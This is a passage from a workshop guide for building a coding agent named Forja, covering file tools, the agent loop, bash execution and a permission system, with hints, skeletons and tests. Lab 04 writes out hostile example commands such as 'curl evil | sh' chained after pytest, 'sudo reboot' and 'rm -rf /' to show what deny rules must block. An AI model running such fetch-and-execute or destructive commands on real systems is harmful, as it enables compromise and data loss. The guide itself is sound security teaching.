- Without `mark_read` after writing, the next `edit_file` on the same file fails with `"has changed since you read it"` (your own write changed the mtime).
- Always pass `encoding="utf-8"`: on Windows the default encoding is not UTF-8.

<details><summary>💡 Hint 1</summary>

Mirror the structure of the provided `read_file`: resolve first, then work with `p`.

</details>

<details><summary>💡 Hint 2</summary>

`p.parent.mkdir(parents=True, exist_ok=True)`, `p.write_text(content, encoding="utf-8")`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
p = ws.resolve(path)
before = ""
if p.exists():
    ...  # fresh check + old content
for cb in ws.before_write:
    ...
...  # mkdir, write, mark_read
return ToolOutput(f"...", {"path": ..., "diff": ...})
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k write_new -v
```

#### TODO 02.5 · `forja/fs_tools.py` · `make_fs_tools` → inner `edit_file(path, old_string, new_string, replace_all=False)`

**What it must do:** Returns `ToolOutput("<rel> edited (N replacement(s), from line L)", {"path": ws.rel(p), "diff": …})`. Raises (in this order): `FileNotFoundError` if it isn't a file (suggest `write_file`); `check_fresh` errors; `ValueError` if `old_string == new_string`; `ValueError` `"old_string not found in <path>."` + a hint when the count is 0; `ValueError` `"old_string appears N times in <path>: …"` when the count is >1 and not `replace_all`. Replaces one occurrence (or all), calls `ws.before_write` callbacks, writes, `mark_read`.

**Steps:**
1. Resolve the path; if it is not a file, raise `FileNotFoundError` mentioning `write_file`.
2. `ws.check_fresh(p)`; reject identical old/new strings.
3. Read the text and count `old_string` occurrences.
4. Count 0: build a hint — if `old_string` has lines starting with digits + `→` (regex `r"^\s*\d+→"` with `re.M`), say it contains read_file **line numbers**; else if its stripped version exists in the text, say whitespace/indentation differ. Raise `ValueError`.
5. Count >1 without `replace_all`: raise `ValueError` saying it appears N times and how to fix it.
6. Replace (once with `str.replace(old, new, 1)` or all), call `before_write` callbacks, write UTF-8, `mark_read`.
7. Compute the line of the first match (`text[:text.index(old_string)].count("\n") + 1`) and return the `ToolOutput` with the diff.

**Watch out for:**
- Order matters: `test_edit_requires_read_and_unique` first edits an UNREAD file and expects `"before modifying"` — `check_fresh` must run before counting.
- The duplicate test uses `old_string="return"` and checks `"times"` in the output.
- The line-number test passes `"     9→    return round(value, 2)"` and checks `"line numbers"` in the output: the `→` is the character `read_file` prints.
- `test_edit_detects_external_change` touches the file after reading: just calling `check_fresh` gives `"has changed"`.
- The diff must contain the new line exactly once → replace only the first occurrence by default.

<details><summary>💡 Hint 1</summary>

These error messages are prompts for the model: say what went wrong AND what to do next.

</details>

<details><summary>💡 Hint 2</summary>

`text.count(old_string)`, `text.replace(old, new, 1)`, `re.search(pattern, old_string, re.M)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
p = ws.resolve(path)
if not p.is_file(): raise FileNotFoundError(...)
ws.check_fresh(p)
if old_string == new_string: raise ValueError(...)
text = ...
n = text.count(old_string)
if n == 0: ...   # hint: line numbers? whitespace?
if n > 1 and not replace_all: ...
new_text = ...
# before_write, write, mark_read, line, return ToolOutput
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k "edit_requires or external_change" -v
```

#### TODO 02.6 · `forja/fs_tools.py` · `make_fs_tools` → inner `grep(pattern, path=".", include=None, ignore_case=False, show_content=True)`

**What it must do:** Returns a `str`. With `show_content=True`: one line per match, `"<rel>:<lineno>: <line stripped, max 300 chars>"`. With `show_content=False`: one line per matching file (its relative path). `include` filters by file NAME with `fnmatch` (e.g. `*.py`). Searches a single file if `path` is a file, otherwise `ws.walk(base)`. Skips files that are not UTF-8. Stops at 300 results with a note. Nothing found: `"(no matches)"`.

**Steps:**
1. Compile the regex with `re.I` when `ignore_case`.
2. Resolve `path`; the file list is `[base]` if it is a file, else `ws.walk(base)`.
3. For each file: skip it if `include` is given and the name doesn't match.
4. Read it as UTF-8 inside `try/except (UnicodeDecodeError, OSError)` and skip on error.
5. Enumerate lines from 1; on `rx.search(line)`: append the formatted line, or (paths-only mode) append the path once and stop reading that file.
6. Stop with a note when you reach 300 results; return the joined lines or `"(no matches)"`.

**Watch out for:**
- Line numbers start at 1: `test_grep_and_glob` expects `"invoices/amounts.py:7:"` for `def round_amount`.
- Use `ws.rel(f)` for the path, not the absolute path.
- `include` is matched against `f.name`, not the full path.
- In paths-only mode each file must appear once even if many lines match.
- An invalid regex raises `re.error`; that's fine — `execute` turns it into an error message for the model.

<details><summary>💡 Hint 1</summary>

Look at the provided `glob` tool right above: same walk, different filter.

</details>

<details><summary>💡 Hint 2</summary>

`enumerate(text.splitlines(), 1)`, `fnmatch.fnmatch(f.name, include)`, `rx.search(line)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
rx = re.compile(pattern, re.I if ignore_case else 0)
base = ws.resolve(path)
files = [base] if base.is_file() else ws.walk(base)
out = []
for f in files:
    ...  # include filter, read (skip binaries), match lines
    if len(out) >= 300: ...
return "\n".join(out) or "(no matches)"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l02_tools.py -k grep -v
```

### Run
```bash
python scripts/tasks.py test 02
forja --cwd playground
> what does the due_date function do?        (no loop yet: it answers as a chat; tools arrive in lab 03)
```

### Try it in your agent
1. `python scripts/tasks.py test 02` → `8 passed`.
2. Drive the tools by hand from a Python REPL at the repo root (`python`, then type):
```python
import json; from pathlib import Path
from forja.fs_tools import Workspace, make_fs_tools
from forja.tools import ToolRegistry; from forja.types import ToolCall
r = ToolRegistry().register(*make_fs_tools(Workspace(Path("playground"))))
x = lambda name, **a: print(r.execute(ToolCall("1", name, json.dumps(a))).output)
x("grep", pattern="def ", include="*.py")
```
You should SEE lines like `invoices/amounts.py:7: def round_amount(value: float) -> float:`.
3. In the same REPL: `x("read_file", path="../README.md")` → `ERROR in 'read_file': PermissionError: path outside the workspace: ../README.md`; `x("edit_file", path="invoices/dates.py", old_string="a", new_string="b")` → `… read invoices/dates.py with read_file before modifying it`.
4. See what the model will read: `print(json.dumps(r.schemas()[2], indent=2))` → the `edit_file` schema, with its long description, `required` and `"additionalProperties": false`, and no `title` keys.
5. `forja --cwd playground`: the note `tools: lab 02 pending` is gone. It is still a chat (`agent: lab 03 pending — chat mode without tools`), so the model cannot call your tools yet — that's lab 03.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| Every file-tool test fails with `NotImplementedError: TODO 02.2` or `TODO 02.3` | All tests go through `registry.execute` and `ws.resolve` → finish 02.2 and 02.3 first. |
| `AttributeError: 'NoneType' object has no attribute 'name'` in `execute` | Unknown tool → `t` is `None` → use `call.name` when building the error result. |
| Test expects `"before modifying"` but output says `"old_string not found"` | You count occurrences before `ws.check_fresh(p)` → move the freshness check up. |
| `edit_file` works once, then the next edit says `has changed since you read it` | Missing `ws.mark_read(p)` after writing → call it at the end of write_file and edit_file. |
| `AssertionError: 'line numbers' in …` in the edit test | Your hint regex doesn't match `"     9→    return …"` → use `^\s*\d+→` with `re.M`, and copy the `→` character from `read_file`'s code. |
| `UnicodeDecodeError` / mojibake when writing on Windows | Missing `encoding="utf-8"` in `write_text`/`read_text` → always pass it. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 02` → all 8 tests green.
- [ ] [ ] From the REPL you get a numbered `read_file`, a `grep` with `path:line:` hits and a sandbox error for `../`.
- [ ] [ ] Your `edit_file` error messages tell the model how to fix its call.

### Checkpoint
Lab 02 tests green. With lab 03 still pending, Forja is still a chat: the loop comes next.

### Challenges
1. Add a `list_dir` tool with a 2-level tree. Does it help or hurt the model's exploration?
2. Ask the model to edit something and watch its `old_string` mistakes: which hint would you add to the error message?

**Tests:** `tests/test_l02_tools.py` · **Fallen behind?** `python scripts/tasks.py catchup 03`


---

## Lab 03 · The agent loop

*Day 1 · 11:30–12:15*

**Goal:** Write the loop that turns a model into an agent: think → act → observe, until done.

### Concepts
- **Ten lines:** ask for a response with tools → if no tools requested, done → execute → append results → repeat. Every agent framework is this with more layers.
- **History is the state:** each `assistant` with `tool_calls` is followed by one `tool` message per `tool_call_id`. Breaking the pair = HTTP 400 on almost any backend.
- **Parallel reads, ordered writes:** several `read_file`/`grep` calls run in parallel; an edit and a `pytest` never do.
- **Explicit stops:** final answer, max steps, loop detected (same tool + same args) and user interrupt (Ctrl+C).
- **The loop knows nothing about permissions or UI:** it gets an `execute` function (the harness gate) and `events`. That's why we reuse it for subagents and evals.

### What you implement
| TODO | File | What |
|---|---|---|
| 03.1 | `forja/agent.py` | _run_calls: consecutive reads in parallel, order preserved |
| 03.2 | `forja/agent.py` | run: the loop with streaming, stops and loop detection |

### Before you start
- Open `forja/agent.py` (`Events`, `AgentResult`, `Agent` and your two TODOs), `forja/fake_llm.py` (`FakeLLM`, `say`, `call`, `calls`: the scripted model the tests use) and `tests/test_l03_agent.py`.
- Message protocol (Chat Completions): an assistant message with `tool_calls` must be followed by one `{"role": "tool", "tool_call_id": …}` message per call, before the next assistant message. `ChatResponse.to_message()` and `ToolResult.to_message()` (provided) build those dicts for you.
- `self.llm.stream(messages, tools=...)` yields `TextDelta` and a final `Done` (your lab 01, or `FakeLLM` in tests, which yields text in 8-character pieces). `self.tools.schemas()` (lab 02) is the `tools` list.
- Stdlib: `concurrent.futures.ThreadPoolExecutor` (`ex.map(fn, iterable)`), `collections.Counter`, `threading.Event.is_set()`.
- How it connects: the harness creates `Agent(llm, registry, execute=self.gate, events=RichEvents(), …)`. The loop never knows about permissions or UI — it only calls `execute` and `events`. The same class is reused for subagents (lab 09) and evals (lab 12).

### Step by step
Start with the no-tools path of 03.2 (stream, append the assistant message, return `"final"`, plus the cancel check): that makes `test_final_answer`, `test_streaming_events` and `test_cancel` green. Then write 03.1 `_run_calls`, then complete 03.2 with tool execution, `max_steps` and loop detection. All 03.1 tests run through `run`, so you need both.

#### TODO 03.1 · `forja/agent.py` · `Agent._run_calls(calls)`

**What it must do:** `_run_calls(calls: list[ToolCall]) -> list[ToolResult]`, results in the SAME order as `calls`. Uses `self.execute` if set, otherwise `self.tools.execute`. For each call: `self.events.on_tool_start(call)`, execute, `self.events.on_tool_end(call, result)`. Runs of CONSECUTIVE read-risk calls (`self._is_read(call)`) run in parallel in a `ThreadPoolExecutor` when `self.parallel_reads`; everything else runs sequentially in order.

**Steps:**
1. Pick the executor function: `self.execute or self.tools.execute`.
2. Pre-allocate `results = [None] * len(calls)` and write a small inner function `run(i)` that fires the start event, executes `calls[i]` into `results[i]` and fires the end event.
3. Walk the calls with an index `i`. If `calls[i]` is a read, advance `j` while the calls are reads.
4. If the block has more than one read, run indices `i..j-1` with a `ThreadPoolExecutor` (e.g. up to 8 workers); a single read just runs. Set `i = j`.
5. Non-read calls: `run(i)` and `i += 1`.
6. Return the results list.

**Watch out for:**
- `test_parallel_reads_keep_order`: three 0.2 s reads + one write must take < 0.5 s AND produce tool contents `["r1", "r2", "r3", "wa"]` with ids in the original order. Store by index; `as_completed` order is random.
- Only CONSECUTIVE reads: `[read, write, read]` must not run the second read before the write.
- `test_custom_execute_gate` asserts your gate is used: calling `self.tools.execute` directly skips permissions in the real CLI.
- Consume `ex.map(...)` (e.g. `list(...)`) or exceptions in workers are silently lost; leaving the `with` block waits for all of them.

<details><summary>💡 Hint 1</summary>

Index-based writing (`results[i] = …`) is what keeps the order, no matter which thread finishes first.

</details>

<details><summary>💡 Hint 2</summary>

`with ThreadPoolExecutor(max_workers=min(8, j - i)) as ex: list(ex.map(run, range(i, j)))`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
execute = self.execute or self.tools.execute
results = [None] * len(calls)
def run(i): ...   # start event, execute, end event
i = 0
while i < len(calls):
    if self.parallel_reads and self._is_read(calls[i]):
        ...  # find j, pool or single
    else:
        ...
return results
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l03_agent.py -k "parallel or gate" -v
```

#### TODO 03.2 · `forja/agent.py` · `Agent.run(messages)`

**What it must do:** `run(messages: list[dict]) -> AgentResult(answer, stop_reason, steps, usage, tool_calls)`. `messages` is MODIFIED IN PLACE (the harness reads it afterwards). Stop reasons: `"final"` (no tool calls; answer = `resp.content or ""`, steps = current step), `"interrupted"` (`self.cancel` set at the start of a step; steps = step - 1), `"loop"` (same tool name + same arguments string requested more than `self.max_repeats` times in this run), `"max_steps"` (steps = `self.max_steps`). `usage` sums all responses; `tool_calls` counts executed calls. The history must stay valid in every case: every `tool_call` id gets a `tool` message.

**Steps:**
1. Create a `Counter` for usage, a `Counter` for `(name, arguments)` pairs, and a call counter.
2. `for step in range(1, self.max_steps + 1)`: first, if `self.cancel.is_set()`, return the `"interrupted"` result.
3. Stream: `self.llm.stream(messages, tools=self.tools.schemas() or None)`; forward every `TextDelta` to `self.events.on_text`, keep the `Done` response.
4. Add its usage, `messages.append(resp.to_message())`, call `self.events.on_assistant(resp)`.
5. No `resp.tool_calls` → return `"final"`.
6. Loop detection: count each `(c.name, c.arguments)`; if one exceeds `self.max_repeats`, append a failed `ToolResult(cc.id, cc.name, False, "Not executed: loop detected.").to_message()` for EVERY call of this response and return `"loop"`.
7. Otherwise `results = self._run_calls(resp.tool_calls)`, update the counter, extend `messages` with `r.to_message()` for each result. After the `for`, return `"max_steps"`.

**Watch out for:**
- `test_final_answer` expects `steps == 1` and the last message to be the assistant's.
- `test_streaming_events` checks `on_text` got MORE THAN ONE piece: forward each `TextDelta`, don't emit the full text at the end.
- Use `resp.to_message()`: a hand-made `{"role": "assistant", "content": …}` without `tool_calls` breaks the pairing and real backends answer HTTP 400.
- `test_max_steps_and_loop` walks the history after a `"loop"` stop and asserts no tool_call id is left open → close all pending calls before returning.
- Pass `tools=None` when there are no schemas: some servers reject `tools=[]`.

<details><summary>💡 Hint 1</summary>

Write the ten-line version first (stream → append → no tools? return → run calls → append → repeat), then add cancel, loop detection and counters.

</details>

<details><summary>💡 Hint 2</summary>

`Counter.update(dict)` adds values key by key — perfect for `resp.usage`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
usage, seen, n_calls = Counter(), Counter(), 0
for step in range(1, self.max_steps + 1):
    if self.cancel.is_set(): return AgentResult(...)
    resp = None
    for ev in self.llm.stream(...):
        ...  # TextDelta -> on_text, Done -> resp
    ...  # usage, append, on_assistant, final?
    ...  # loop detection (close pending calls!)
    ...  # run calls, append tool messages
return AgentResult(..., "max_steps", self.max_steps, ...)
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l03_agent.py -k "final or streaming or cancel or max_steps" -v
```

### Run
```bash
python scripts/tasks.py test 03
forja --cwd playground
> explain how an invoice total is calculated
```

### Try it in your agent
1. `python scripts/tasks.py test 03` → `6 passed`.
2. `forja --cwd playground` and ask `explain how an invoice total is calculated`. You should SEE blue lines per tool call, e.g. `⏺ grep {"pattern": "def total", …}` followed by dim `⎿ invoices/invoice.py:…` (raw JSON args until lab 05 makes them pretty), then a streamed answer with `path:line` references and `(N steps · M tools)`.
3. Ask `read amounts.py and dates.py and summarise both`: if the model requests both reads in one response, they run in parallel (both `⏺` lines appear before the results).
4. Ask it to change something, e.g. `add a docstring to total_with_vat`. Until lab 04/05 you get a crude prompt `Allow edit_file {…}? [y/N]` — answer `n` and see the model react to `DENIED by the user`.
5. Press Ctrl+C while it works: `interrupting…`, then the turn stops at the next step with `(interrupted by the user)`.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_parallel_reads_keep_order` fails on time (≈0.6 s or more) | Reads are running sequentially → check `_is_read` grouping and that you use the pool for blocks > 1. |
| `test_parallel_reads_keep_order` fails on order (`['r2', 'r1', …]`) | Results appended as threads finish → write into `results[i]`. |
| `AssertionError: assert not open_ids` in `test_max_steps_and_loop` | On `"loop"` you returned without answering the pending tool_calls → append a failed tool message for each. |
| Real backend: `400 … tool_call_id … not found` / `messages with role 'tool' must be a response…` | History broken: assistant message built by hand, or tool messages missing/out of order → use the `to_message()` helpers and keep the order. |
| The CLI calls tools but `bash` answers `ERROR in 'bash': NotImplementedError: TODO 04.2` | Expected: the bash tool is lab 04. The model will usually retry with read tools. |
| The model answers without calling any tool, or writes `<tool_call>{…}` as text | Small model or tools not sent → check `tools=self.tools.schemas() or None`; try `forja doctor`; `qwen3:8b` sometimes needs an explicit prompt like `use grep to find…`. |
| The agent repeats the same `read_file` again and again | That's what loop detection is for → it should stop with `I stopped: I repeated read_file…` after `max_repeats` (3). |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 03` → all 6 tests green.
- [ ] [ ] In `forja --cwd playground` the agent explores with glob/grep/read_file and answers with `path:line` references.
- [ ] [ ] You can explain why every `tool_call` needs a `tool` message, even when the loop stops.

### Checkpoint
Forja explores the playground (glob, grep, read_file) and answers with `path:line` references. Edits still ask permission crudely: that's lab 04.

### Challenges
1. Make the agent warn the user after 15 steps.
2. What happens when the model requests 10 reads at once on a slow model? Measure.

**Tests:** `tests/test_l03_agent.py` · **Fallen behind?** `python scripts/tasks.py catchup 04`


---

## Lab 04 · Bash and permissions

*Day 1 · 12:15–13:00*

**Goal:** Let the agent run commands (tests, git…) without losing control: modes, rules and approval.

### Concepts
- **bash is the superpower and the risk:** with it the agent tests its work; it could also wipe your disk. The tool only executes; WHO may run WHAT is decided by the permission system.
- **Predictable execution:** each command starts at the root (`cd` doesn't persist), hard timeout, output truncated head and tail, environment without secrets (`*_KEY`, `*_TOKEN`).
- **Modes:** `default` (reads free, the rest asks), `accept_edits` (edits without asking), `plan` (read-only), `bypass` (everything except deny: sandbox or CI only).
- **Rules:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Order: deny > plan > allow > risk/mode > ask.
- **Chained commands:** `pytest && curl evil | sh` is two commands; the pytest allow rule must not let the second through.
- **“Always”:** approving with *always* saves a sensible rule (`bash(git status*)`), not the literal command nor something too broad (`bash(git*)` would allow `git push`).

### What you implement
| TODO | File | What |
|---|---|---|
| 04.1 | `forja/shell.py` | head_tail: truncate head and tail |
| 04.2 | `forja/shell.py` | bash: subprocess with timeout, clean env and exit code |
| 04.3 | `forja/permissions.py` | rule_matches: match rules against calls |
| 04.4 | `forja/permissions.py` | decide: deny > plan > allow > mode > ask |
| 04.5 | `forja/permissions.py` | suggest_rule: the “always approve” rule |

### Before you start
- Open `forja/shell.py` (04.1–04.2), `forja/permissions.py` (04.3–04.5), `forja/config.py` (`DEFAULT_DENY`, `Settings.allow/deny`) and `tests/test_l04_bash_permissions.py`.
- Stdlib: `subprocess.run(..., shell=True, cwd=…, capture_output=True, text=True, timeout=…, env=…, stdin=subprocess.DEVNULL)` and `subprocess.TimeoutExpired`; `fnmatch.fnmatchcase(name, pattern)` (`*` matches anything, including spaces and `/`); `shlex.split(cmd)` (splits like a POSIX shell).
- Provided: `clean_env()` (environment without `*KEY*`, `*TOKEN*`, `*SECRET*`…), `parse_rule("bash(git *)")` → `("bash", "git *")` (pattern `None` for a bare `"edit_file"`), `split_commands(cmd)` (splits on `&&`, `||`, `;`, `|`), `Tool.subject(args)` (the command for bash, the path for file tools) and `tool.risk` (`"read"`, `"edit"`, `"exec"`).
- Shell: with `shell=True` the command runs in `/bin/sh` on macOS/Linux and **cmd.exe on Windows** (`ls`, `cat`, `rm -rf` don't exist there; `dir`, `type` do). The tool description tells the model which shell it has.
- How it connects: the harness gate calls `decide(tool, args, mode, settings.allow, settings.deny)`: `"deny"` → error to the model, `"ask"` → approval prompt, `"allow"` → execute. When the user answers *always*, `suggest_rule` produces the rule appended to `settings.allow` for the session.

### Step by step
04.1 `head_tail` (pure, 5 minutes) → 04.2 `bash` (uses it) → 04.3 `rule_matches` → 04.4 `decide` (uses `rule_matches`) → 04.5 `suggest_rule` (independent). Shell and permissions are separate files: if you are a pair, one can start 04.3 while the other does 04.1–04.2.

#### TODO 04.1 · `forja/shell.py` · `head_tail(text, limit=MAX_SHELL_OUTPUT)`

**What it must do:** `head_tail(text: str, limit: int = 20_000) -> str`. If `len(text) <= limit`, return it unchanged. Otherwise return the first `limit // 4` characters, a note in the MIDDLE saying how many characters were omitted (must contain the word `omitted`), and the last `limit * 3 // 4` characters. `test_head_tail_and_env`: with 1000 `A` + 1000 `B` and limit 400, output starts with `A`, ends with `B` and contains `omitted`.

**Steps:**
1. Return early if the text fits.
2. Slice the head (a quarter of the limit) and the tail (three quarters, from the end).
3. Build `head + note + tail`, with the omitted count `len(text) - limit` in the note.

**Watch out for:**
- The tail is larger on purpose: test failures and tracebacks are at the END of the output.
- The note must be in the middle; if you append it at the end, `endswith("B")` fails.
- Negative slicing: `text[-n:]` is the last `n` characters.

<details><summary>💡 Hint 1</summary>

One `if` and one f-string.

</details>

<details><summary>💡 Hint 2</summary>

`text[: limit // 4]` and `text[-(limit * 3 // 4):]`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
if len(text) <= limit:
    return text
head, tail = ..., ...
return f"{head}\n…[{...} characters omitted]…\n{tail}"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k head_tail -v
```

#### TODO 04.2 · `forja/shell.py` · `make_shell_tool` → inner `bash(command, timeout=default_timeout)`

**What it must do:** Returns `ToolOutput("exit_code=N\n<output>", {"exit_code": N})` where output is stdout plus, if any, `"\n[stderr]\n" + stderr`, stripped and passed through `head_tail` (or `"(no output)"`). Runs at `ws.root` with `shell=True`, `env=clean_env()`, `stdin=subprocess.DEVNULL`, `text=True`, captured output and the timeout clamped to 1..600 s. On `subprocess.TimeoutExpired` it RETURNS `ToolOutput("TIMEOUT after Ns.\n…", {"exit_code": None})` — it does not raise. A non-zero exit code is a normal result (`ok=True`): the model must see the failing tests.

**Steps:**
1. Clamp the timeout: `max(1, min(int(timeout), 600))`.
2. In a `try`, call `subprocess.run` with the arguments of the contract.
3. On `TimeoutExpired`, return the TIMEOUT `ToolOutput` (you may include partial output if `e.stdout` is a str).
4. Combine stdout and stderr (stderr under a `[stderr]` marker), strip, `head_tail` it.
5. Return `ToolOutput(f"exit_code={p.returncode}\n…", {"exit_code": p.returncode})`.

**Watch out for:**
- `test_bash_runs_in_root_with_exit_code` runs `python -m pytest -q tests/test_invoice.py`: it only works if `cwd=ws.root` (the playground copy) — and the output must START with `exit_code=0`.
- `test_bash_timeout` expects `"TIMEOUT"` in the output: if you let the exception escape, `execute` prints `TimeoutExpired`, which doesn't contain `TIMEOUT` in capitals.
- Without `stdin=subprocess.DEVNULL` a command that waits for input (an editor, a `y/n` question) hangs the agent.
- Use `env=clean_env()`: the agent must never see `OPENROUTER_API_KEY` & co.
- Windows: the timeout kills `cmd.exe` but its child may keep running until it ends, so `test_bash_timeout` can take ~5 s there. It still passes.

<details><summary>💡 Hint 1</summary>

`subprocess.run` with `capture_output=True, text=True` gives you `p.stdout`, `p.stderr`, `p.returncode`.

</details>

<details><summary>💡 Hint 2</summary>

`except subprocess.TimeoutExpired as e:` — return, don't raise.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
timeout = max(1, min(int(timeout), 600))
try:
    p = subprocess.run(command, shell=True, cwd=ws.root, ...)
except subprocess.TimeoutExpired as e:
    return ToolOutput(f"TIMEOUT after {timeout}s.\n...", {"exit_code": None})
out = ...  # stdout + optional [stderr] block
return ToolOutput(f"exit_code={p.returncode}\n...", {...})
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k test_bash -v
```

#### TODO 04.3 · `forja/permissions.py` · `rule_matches(rule, tool, args)`

**What it must do:** `rule_matches(rule: str, tool: Tool, args: dict) -> bool`. `name, pattern = parse_rule(rule)`. The tool name must match `name` with `fnmatchcase` (so `"mcp__issues__*"` matches `mcp__issues__get`). No pattern → `True`. With a pattern: `fnmatchcase(subject, pattern)` where `subject = tool.subject(args)`; for bash, normalise whitespace first (`" ".join(subject.split())`). It compares the whole string; chains are `decide`'s job.

**Steps:**
1. Parse the rule into name and pattern.
2. If the tool name doesn't match the name pattern, return `False`.
3. If there is no pattern, return `True`.
4. Get the subject; if the tool is `bash`, collapse runs of whitespace.
5. Return whether the subject matches the pattern.

**Watch out for:**
- `test_rule_matching`: `"git   status --short"` (three spaces) must match `bash(git status*)`.
- `bash(git status*)` must NOT match `git push`.
- The MCP test builds `Tool("mcp__issues__get", "", None, None, "exec")` with no args model: only use `tool.name` and `tool.subject(args)`.
- Use `fnmatchcase`, not `fnmatch`: `fnmatch` is case-insensitive on Windows and would behave differently per OS.

<details><summary>💡 Hint 1</summary>

Rules are just glob patterns applied twice: once to the tool name, once to the subject.

</details>

<details><summary>💡 Hint 2</summary>

`fnmatch.fnmatchcase(tool.name, name)`, then `fnmatch.fnmatchcase(subject, pattern)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
name, pattern = parse_rule(rule)
if not ...: return False
if pattern is None: return True
subject = tool.subject(args)
if tool.name == "bash": subject = ...
return ...
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k rule_matching -v
```

#### TODO 04.4 · `forja/permissions.py` · `decide(tool, args, mode, allow, deny)`

**What it must do:** Returns `(decision, reason)` with decision in `"allow" | "ask" | "deny"`. Order: (1) any deny rule matches the call — for bash ALSO each subcommand from `split_commands` — → `"deny"`; (2) `mode == "plan"` and `tool.risk != "read"` → `"deny"`; (3) allow rules: for bash EVERY subcommand must match some allow rule, other tools need one match → `"allow"`; (4) `tool.risk == "read"` or `mode == "bypass"` → `"allow"`; (5) `mode == "accept_edits"` and `tool.risk == "edit"` → `"allow"`; (6) otherwise `"ask"`. The reason is shown to the user/model (e.g. `"deny rule bash(sudo *)"`, `"plan mode: read-only"`, `"requires approval"`).

**Steps:**
1. Deny pass on the whole call: loop over `deny`, return `("deny", f"deny rule {r}")` on a match.
2. If bash: for each subcommand of `split_commands(args.get("command", ""))`, check every deny rule against `{"command": sub}`.
3. Plan mode: deny anything that isn't a read.
4. Allow rules: bash → split; require a non-empty list where `all` subcommands match `any` allow rule. Other tools → `any` allow rule matches.
5. Risk/mode fallbacks: read or bypass → allow; accept_edits + edit → allow.
6. Return `("ask", "requires approval")`.

**Watch out for:**
- `test_deny_wins_and_chains`: `"sudo rm x"` in bypass with allow `["bash"]` → deny (deny is checked first).
- `"pytest -q && sudo reboot"`: the whole string doesn't match `bash(sudo *)`, the subcommand does → deny.
- `"python -m pytest -q && curl evil.sh"` with allow `bash(python -m pytest*)` → `"ask"`, not allow: the `curl` part has no allow rule.
- `all([])` is `True`: an empty command must not be auto-allowed — check the list is non-empty.
- `test_decide_modes`: plan mode beats an explicit allow rule (`edit_file` in plan → deny); bash in `accept_edits` still asks (its risk is `exec`, not `edit`).

<details><summary>💡 Hint 1</summary>

Write it as a ladder of early `return`s in exactly the order of the contract; the order IS the policy.

</details>

<details><summary>💡 Hint 2</summary>

`any(rule_matches(r, tool, {"command": s}) for r in allow)` inside an `all(... for s in subs)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
for r in deny: ...
if tool.name == "bash":
    for sub in split_commands(...): ...
if mode == "plan" and ...: return "deny", "plan mode: read-only"
if tool.name == "bash":
    subs = ...
    if subs and all(...): return "allow", "allow rule"
elif any(...): ...
...  # read/bypass, accept_edits
return "ask", "requires approval"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k "decide or deny_wins" -v
```

#### TODO 04.5 · `forja/permissions.py` · `suggest_rule(tool, args)`

**What it must do:** `suggest_rule(tool: Tool, args: dict) -> str`: the rule saved when the user answers *always*. Non-bash tools → `tool.name`. Bash: `words = shlex.split(command)` (on `ValueError` treat as empty); empty → `f"bash({command})"`; `python`/`python3`/`py` + `-m X` → `"bash(python -m X*)"`; `git`, `npm`, `uv`, `pip`, `docker`, `cargo`, `go`, `dotnet` with a subcommand → `"bash(<cmd> <sub>*)"`; anything else → `"bash(<cmd>*)"`. Note: no space before `*`.

**Steps:**
1. Non-bash: return the tool name.
2. Split the command with `shlex.split`, catching `ValueError` (unbalanced quotes).
3. Handle the empty case.
4. `python -m X` case (check there are at least 3 words and the second is `-m`).
5. Tools-with-subcommands case (at least 2 words).
6. Default: first word + `*`.

**Watch out for:**
- `test_suggest_rule` expects exactly `bash(python -m pytest*)`, `bash(git status*)`, `bash(ls*)` and `edit_file` — no space before `*`.
- Too broad is dangerous: `bash(git*)` would also allow `git push`; `bash(python*)` would allow any script.
- Too narrow is useless: the literal command `bash(python -m pytest -q tests/x.py)` would ask again next time with other flags.

<details><summary>💡 Hint 1</summary>

Decide the shape from the first one or two words only.

</details>

<details><summary>💡 Hint 2</summary>

`shlex.split("python -m pytest -q")` → `['python', '-m', 'pytest', '-q']`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
if tool.name != "bash": return tool.name
try: words = shlex.split(...)
except ValueError: words = []
if not words: return ...
if words[0] in ("python", "python3", "py") and ...: return ...
if words[0] in ("git", "npm", ...) and len(words) > 1: return ...
return f"bash({words[0]}*)"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k suggest_rule -v
```

### Run
```bash
python scripts/tasks.py test 04
forja --cwd playground
> run the tests and tell me which ones fail
```

### Try it in your agent
1. `python scripts/tasks.py test 04` → `8 passed`.
2. `forja --cwd playground` and ask `run the tests and tell me which ones fail`. You should SEE `⏺ bash {"command": "python -m pytest -q"}` and an approval prompt (until lab 05 it is the minimal `Allow bash {'command': 'python -m pytest -q'}? [y/N]`). Answer `y`: `⎿ exit_code=1 (+N lines)` and an answer naming `test_round_half_up`, `test_total_with_vat_cent` and `test_due_date_sunday_moves_to_monday`.
3. Ask `run sudo ls` (or `run rm -rf /`): red `⎿ DENIED (deny rule bash(sudo *)). Don't retry it…` without any prompt — the policy decided.
